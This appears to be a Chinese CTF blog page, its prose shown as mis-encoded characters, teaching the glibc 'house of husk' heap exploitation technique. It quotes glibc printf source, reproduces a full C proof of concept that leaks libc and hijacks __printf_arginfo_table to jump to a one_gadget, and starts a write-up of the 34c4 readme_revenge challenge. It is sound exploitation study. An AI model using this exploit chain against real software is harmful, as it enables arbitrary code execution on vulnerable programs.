<p><strong>æ€»ç»“ï¼š</strong> é‡è§è¿™ç§å°‘åº“çš„æ€è·¯å°±æ˜¯å…ˆ <code>apt search</code> çœ‹ä¸€ä¸‹å°‘çš„åº“ï¼Œç„¶åå°‘å“ªä¸ªå®‰å“ªä¸ªå³å¯ï¼Œå¦‚æœå®‰è£…ä¹‹åè¿˜å°‘åº“ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯æŒ‰ç…§çš„ç‰ˆæœ¬ä¸å¯¹ï¼Œåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥å³å¯</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f08e34cf08ad">qemué€ƒé€¸å­¦ä¹ ç¬”è®° - ç®€ä¹¦ (jianshu.com)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-265501.htm#msg_header_h2_6">åŸåˆ›]QEMUé€ƒé€¸åˆæ¢-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#pci%E8%AE%BE%E5%A4%87%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4">qemu-pwn-åŸºç¡€çŸ¥è¯† Â« å¹³å‡¡è·¯ä¸Š (ray-cp.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45209963/article/details/127332351">(45æ¡æ¶ˆæ¯) qemué€ƒé€¸å°è¯†_mmio_write_xyzmpvçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU é€ƒé€¸ æ½¦è‰ç¬”è®° | Clangè£ç¼åº— (xuanxuanblingbling.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/588124131">QEMUé€ƒé€¸ç³»åˆ— - çŸ¥ä¹ (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254906">QEMUé€ƒé€¸åˆæ¢ï¼ˆä¸€ï¼‰-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/">https://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/6c83c2a2.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/6c83c2a2.html" class="post-title-link" itemprop="url">å…³äºhouse of huskçš„å­¦ä¹ æ€»ç»“</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-15 07:36:47 / ä¿®æ”¹æ—¶é—´ï¼š08:58:00" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ æ€»ç»“</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><blockquote>
<p>ä»‹ç»ï¼š</p>
<p><code>house of husk</code> æ˜¯å¯¹ <code>printf</code> å‡½æ•°å†…éƒ¨è¿›è¡Œæ³¨å†Œçš„è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦çš„å‡½æ•°æŒ‡é’ˆè¿›è¡Œäº†åŠ«æŒ</p>
<p>ä½¿ç”¨ç‰ˆæœ¬ï¼š</p>
<p>ç»è¿‡æµ‹è¯•ï¼Œ<code>glibc 2.23--2.35</code> ç‰ˆæœ¬ä¸­ï¼Œè¯¥æ‰‹æ³•å‡å¯ç”¨</p>
<p>æ¼æ´åŸç†ï¼š</p>
<p><code>printf</code> å‡½æ•°é€šè¿‡æ£€æŸ¥ <code>__printf_function_table</code> æ˜¯å¦ä¸ºç©ºï¼Œæ¥åˆ¤æ–­æ˜¯å¦æœ‰è‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œå¦‚æœåˆ¤å®šä¸ºæœ‰çš„è¯ï¼Œåˆ™ä¼šå»æ‰§è¡Œ <code>__printf_arginfo_table[spec]</code> å¤„çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨è¿™æœŸé—´å¹¶æ²¡æœ‰è¿›è¡Œä»»ä½•åœ°å€çš„åˆæ³•æ€§æ£€æŸ¥</p>
<p>åˆ©ç”¨æ–¹æ³•ï¼š</p>
<p>åŠ«æŒ <code>__printf_function_table</code> ä½¿å…¶ä¸ä¸ºç©ºï¼ŒåŠ«æŒ <code>__printf_arginfo_table</code> ä½¿å…¶è¡¨ä¸­å­˜æ”¾çš„ <code>spec</code> çš„ä½ç½®æ˜¯ <code>backdoor()</code> ï¼Œæ‰§è¡Œåˆ° <code>printf</code> å‡½æ•°æ—¶å°±å¯ä»¥å°†æ‰§è¡ŒæµåŠ«æŒåˆ° <code>backdoor()</code></p>
<p>specæ˜¯æ ¼å¼åŒ–å­—ç¬¦ï¼Œæ¯”å¦‚æœ€åè°ƒç”¨çš„æ˜¯ <code>printf(&quot;%X\n&quot;,a)</code>,é‚£ä¹ˆåº”è¯¥å°† <code>__printf_arginfo_table[88]</code> çš„ä½ç½®å†™å…¥ <code>backdoor()</code></p>
<p>ä½¿ç”¨å‰æï¼š</p>
<ol>
<li><p>èƒ½å‘ <code>__printf_function_table</code> ä¸­å†™å…¥ä»»æ„æ•°æ®ï¼Œä½¿å…¶ä¸ä¸ºç©º</p>
</li>
<li><p>èƒ½å‘ <code>__printf_arginfo_table</code> ä¸­å†™å…¥ä¸€ä¸ªå¯æ§åœ°å€</p>
</li>
<li><p>é€šè¿‡æ¡ä»¶ <code>2</code> ,è®© <code>__printf_arginfo_table[spec]</code> ä¸º <code>backdoor</code> åœ°å€</p>
</li>
</ol>
<p>æ”»å‡»æ•ˆæœï¼š</p>
<p>æ‰§è¡Œåˆ° <code>printf</code> å‡½æ•°æ—¶ï¼Œå°±å¯ä»¥è·³è½¬åˆ° <code>backdoor</code> ä¸Š</p>
</blockquote>
<p>æœ¬æ–‡å‡ºç°çš„ <code>glibc</code> æºç å‡ä¸º <code>2.27</code> ç‰ˆæœ¬</p>
<p>é¦–å…ˆè¦å…ˆè®¤è¯†ä¸‹ <code>__register_printf_function</code> å‡½æ•°,è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯å…è®¸ç”¨æˆ·è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦å¹¶è¿›è¡Œæ³¨å†Œï¼ˆæ³¨å†Œçš„æ„æ€æ˜¯è¯´å°†è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦ä¸ç›¸åº”çš„å¤„ç†å‡½æ•°ç›¸å…³è”ï¼‰ï¼Œä»¥æ‰“å°ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®ç±»å‹çš„æ•°æ®ã€‚</p>
<p><code>__register_printf_function</code> å‡½æ•°æ˜¯å¯¹ <code>__register_printf_specifier</code> è¿›è¡Œçš„å°è£…ï¼Œä¸‹é¢æ˜¯ <code>__register_printf_specifier</code> çš„æºä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">	<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  result = <span class="number">-1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">	(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>spec</code> æ˜¯è‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦ï¼ˆä»¥ <code>ASCII</code> æ‰€è¡¨ç¤ºï¼‰ï¼Œæ¯”å¦‚ä½ ä½¿ç”¨ <code>%a</code> è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦æ¥è¾“å‡ºè‡ªå®šä¹‰çš„æ•°æ®ç±»å‹ï¼Œé‚£ä¹ˆ <code>spec</code> å°±æ˜¯å­—ç¬¦ <code>a</code></p>
<p>ä¸Šé¢çš„ä»£ç å…ˆåšäº†ç¬¬ä¸€ä¸ª <code>if</code> åˆ¤æ–­ï¼Œè¦ç¡®å®š <code>spec</code> ä½äº <code>0</code> å’Œ <code>0xff</code> ä¹‹é—´ï¼Œå¦‚æœä¸åœ¨ <code>ASCII</code> ç å°±ä¼šè¿”å› <code>-1</code></p>
<p>ç¬¬äºŒä¸ªåˆ¤æ–­æ˜¯å¦‚æœ <code>__printf_function_table</code> ä¸ºç©ºï¼Œé‚£ä¹ˆå°±é€šè¿‡ <code>calloc</code> æ¥åˆ†é…ä¸¤ä¸ªç´¢å¼•è¡¨ï¼Œå¹¶å°†åœ°å€å­˜æ”¾åˆ°  <code>__printf_arginfo_table</code> å’Œ <code>__printf_function_table</code> ä¸­ã€‚ä¸¤ä¸ªè¡¨çš„å¤§å°éƒ½ä¸º <code>0x100</code> ï¼Œå¯ä»¥ç»™ <code>0~0xff</code> çš„æ¯ä¸ªå­—ç¬¦æ³¨å†Œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼ˆå‡è®¾æˆ‘å®šä¹‰ä¸€ä¸ª <code>%X</code> çš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œé‚£ä¹ˆ <code>spec</code> å°±æ˜¯ <code>88</code> ï¼Œæ‰€ä»¥å°† <code>__printf_arginfo_table[88]</code> æ­¤å¤„å­˜æ”¾ä¸€ä¸ªå¯¹åº”å¤„ç†å‡½æ•°çš„æŒ‡é’ˆï¼‰</p>
<p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¥ä¸‹æ¥çš„åˆ©ç”¨å¹¶ä¸ä¼šè°ƒç”¨åˆ°ä¸Šé¢è¿™ä¸ªå‡½æ•°ï¼Œä½†éœ€è¦ç”¨åˆ°è¿™ä¸ªæ³¨å†Œè‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦çš„å‰ç½®çŸ¥è¯†ã€‚</strong></p>
<p><code>printf</code> å‡½æ•°è°ƒç”¨äº† <code>vfprintf</code> å‡½æ•°ï¼Œä¸‹é¢çš„ä»£ç æ˜¯ <code>vprintf</code> å‡½æ•°ä¸­çš„éƒ¨åˆ†ç‰‡æ®µï¼Œå¯ä»¥çœ‹å‡ºæ¥å¦‚æœ <code>__printf_function_table</code> ä¸ä¸ºç©ºï¼ˆä¹Ÿå°±æ„å‘³ç€æœ‰è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦è¢«æ³¨å†Œè¿‡äº†ï¼‰é‚£ä¹ˆå°±ä¼šè°ƒç”¨ <code>printf_positional</code> å‡½æ•°,å¦‚æœä¸ºç©ºçš„è¯ï¼Œå°±ä¼šå»æ‰§è¡Œé»˜è®¤æ ¼å¼åŒ–å­—ç¬¦çš„ä»£ç éƒ¨åˆ†ï¼ˆå› æ­¤<strong>æ£€æŸ¥è‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦æ˜¯ä¼˜å…ˆäºé»˜è®¤çš„æ ¼å¼åŒ–å­—ç¬¦</strong>ï¼‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>è€Œ <code>printf_positional</code> å‡½æ•°ä¸­ä¼šåœ¨ä¸‹é¢è¿™ä¸ªä½ç½®è°ƒç”¨ <code>__parse_one_specmb</code> å‡½æ•°</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132054421.png" alt="image-20230213205442536"></p>
<p><code>__parse_one_specmb</code> å‡½æ•°ä¸­æœ€å…³é”®çš„å°±æ˜¯ä¸‹é¢è¿™ä¸ªç‰‡æ®µ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">		   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">		    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æœ€åæ‰§è¡Œäº† <code>(*__printf_arginfo_table[spec-&gt;info.spec])</code> è¿™é‡Œæœ¬åº”æ˜¯æ³¨å†Œçš„æ­£å¸¸çš„å‡½æ•°æŒ‡é’ˆï¼Œä½†å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç¯¡æ”¹ <code>__printf_arginfo_table</code> ä¸­å­˜æ”¾çš„åœ°å€ï¼Œå°†å…¶æ”¹ä¸ºæˆ‘ä»¬å¯æ§çš„å†…å­˜åœ°å€ï¼Œè¿™æ ·æˆ‘åªéœ€è¦åœ¨ <code>__printf_arginfo_table[88]</code> ï¼ˆä»¥ <code>%X</code> ä¸ºä¾‹ï¼‰çš„ä½ç½®å­˜æ”¾ä¸€ä¸ª <code>one_gadget</code> çš„åœ°å€ï¼Œæ‰§è¡Œåˆ°å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®å³å¯è·³è½¬åˆ° <code>one_gadget</code> ä¸Šï¼ˆå¦‚ä¸‹ï¼‰ </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132112362.png" alt="image-20230213210814663"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132107697.png" alt="image-20230213210736611"></p>
<p> <strong>æ³¨æ„ï¼šä¸Šé¢çš„åˆ©ç”¨å§‹ç»ˆéƒ½æ²¡æœ‰æ³¨å†Œè‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œè€Œæ˜¯é€šè¿‡ç›´æ¥ç¯¡æ”¹ <code>__printf_function_table</code> æ¥é”™è®©ç¨‹åºä»¥ä¸ºå­˜åœ¨æ³¨å†Œè¿‡çš„è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦ï¼Œä»è€Œè§¦å‘ <code>__printf_arginfo_table</code> ä¸­çš„å‡½æ•°æŒ‡é’ˆ</strong></p>
<p><code>poc</code> æºè‡ª  <a target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">//now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line">    <span class="comment">//*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;</span></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h3 id="ä¾‹é¢˜åˆ†æ"><a href="#ä¾‹é¢˜åˆ†æ" class="headerlink" title="ä¾‹é¢˜åˆ†æ"></a>ä¾‹é¢˜åˆ†æ</h3><p><a target="_blank" rel="noopener" href="https://github.com/xmzyshypnc/xz_files/tree/master/34c4_readme_revenge">é¢˜ç›®é“¾æ¥</a></p>
<h4 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141234308.png" alt="image-20230214123424178"></p>
<h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141235591.png" alt="image-20230214123517550"></p>
<p>ç¨‹åºå°±æ˜¯å¾€ <code>bss</code> æ®µä¸Šè¾“å…¥æ•°æ®ï¼Œç„¶å <code>printf</code> å°†æ•°æ®æ‰“å°å‡ºæ¥ã€‚</p>
<p>ç¨‹åºä¸ºé™æ€é“¾æ¥ï¼Œå¹¶ä¸” <code>flag</code> å°±åœ¨ <code>data</code> æ®µä¸­ï¼Œåªè¦å°†å…¶è¯»å‡ºæ¥å³å¯</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141238392.png" alt="image-20230214123826356"></p>
<p>ç¨‹åºæ²¡æœ‰å¼€ <code>PIE</code> ä¿æŠ¤ï¼Œå› ä¸ºé™æ€é“¾æ¥çš„åŸå› ï¼Œæ‰€ä»¥ <code>libc</code> ä¸­çš„ä»£ç å’Œæ•°æ®åœ°å€éƒ½æ˜¯å·²çŸ¥çš„ï¼Œè¿™å°±ç»™äº†æˆ‘ä»¬åŠ«æŒ <code>printf</code> å‡½æ•°ä¸­ <code>__printf_arginfo_table</code> å’Œ <code>__printf_function_table</code> ä¸¤ä¸ªæŒ‡é’ˆçš„æœºä¼š</p>
<p>æˆ‘ä»¬å…ˆæœä¸€ä¸‹è¿™ä¸¤ä¸ªåœ°å€çœ‹çœ‹åœ¨å“ª</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141243372.png" alt="image-20230214124341330"></p>
<p>å‘ç°è¾“å…¥æ•°æ®çš„èµ·å§‹åœ°å€ <code>name</code> æ¯”é‚£ä¸¤ä¸ªæŒ‡é’ˆè¦ä½ï¼Œè¿™å°±è¯´æ˜æˆ‘ä»¬å¯ä»¥å¡«å……æ•°æ®ç„¶åç¯¡æ”¹ä¸¤ä¸ªæŒ‡é’ˆï¼Œä»è€Œæ‰§è¡Œ <code>printf</code> å‡½æ•°çš„æ—¶å€™åŠ«æŒæ‰§è¡Œæµ</p>
<h4 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><p>æ­£å¸¸å¡«å……åƒåœ¾æ•°æ®ï¼Œå°† <code>__printf_function_table</code> ç¯¡æ”¹ä¸ºä»»æ„å€¼ï¼ˆä¸ä¸º <code>NULL</code>ï¼‰å³å¯ã€‚</p>
<p>å°† <code>__printf_arginfo_table</code> ç¯¡æ”¹ä¸º <code>åœ°å€A</code> ï¼ˆè¿™ä¸ª <code>åœ°å€A</code> éšæ„ï¼Œåªè¦æ»¡è¶³ <code>*(A+(0x73*8))</code> å¤„çš„å€¼ä¸º <code>__stack_chk_fail()</code> çš„åœ°å€å°±è¡Œï¼ˆ <code>0x73</code> æ˜¯ æ ¼å¼åŒ–å­—ç¬¦<code>s</code> ï¼‰ï¼‰</p>
<p>ä½†å¦‚æœä»…ä»…åªä¼ªé€ ä¸Šé¢ä¸¤ä¸ªä½ç½®çš„æ•°æ®ï¼Œå…¶ä»–åœ°æ–¹å¡«å……ä¸ºåƒåœ¾æ•°æ®çš„è¯ï¼Œåˆ™ä¼šåœ¨ <code>__parse_one_specmb</code> å‡½æ•°ä¸­ä¸‹é¢çš„ä»£ç éƒ¨åˆ†å‡ºç°é—®é¢˜</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_modifier_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || __printf_modifier_table[*format] == <span class="literal">NULL</span></span><br><span class="line">    || HANDLE_REGISTERED_MODIFIER (&amp;format, &amp;spec-&gt;info) != <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨æº¢å‡ºä¼ªé€ æ•°æ®æ—¶ï¼Œéœ€è¦æ§åˆ¶ <code>__printf_modifier_table</code> ä¸º <code>NULL</code> ä¸ç„¶ä¼šè§¦å‘ä¸€äº›åˆ«çš„æ¡ä»¶çš„åˆ¤æ–­å¯¼è‡´ç¨‹åºå´©æºƒæˆ–è€…æ‰§è¡Œæµèµ°åï¼Œè¿™ä¸ª <code>__printf_modifier_table</code> ä½äº <code>__printf_function_table</code> åœ°å€åŠ  <code>8</code> çš„ä½ç½®</p>
<p>æ»¡è¶³ä¸Šé¢çš„éƒ¨åˆ†å°±å¯ä»¥æˆåŠŸåœ¨ <code>*__printf_arginfo_table[spec-&gt;info.spec]</code> è¿™ä¸ªä½ç½®æ¥åŠ«æŒæ‰§è¡Œæµï¼Œæˆ‘ä»¬å°†æ­¤å¤„æ§åˆ¶ä¸º <code>__stack_chk_fail()</code> ï¼Œè¯¥å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šæ‰“å°å‡º <code>__libc_argv[0]</code> æŒ‡å‘çš„å­—ç¬¦ä¸²</p>
